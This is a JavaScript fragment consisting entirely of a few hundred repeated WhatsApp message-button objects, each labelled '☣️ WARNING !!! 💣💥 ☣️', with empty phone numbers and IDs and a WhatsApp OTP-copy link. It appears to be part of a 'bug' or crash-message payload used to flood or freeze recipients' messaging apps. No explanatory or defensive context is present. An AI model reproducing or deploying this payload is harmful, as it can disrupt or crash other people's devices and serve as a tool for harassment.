{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
   { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
 { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
 { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
  { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
   { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
 { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
 { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
  { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
   { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
 { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
 { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
  { callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ WARNING !!! 💣💥 ☣️`, id: ``}},
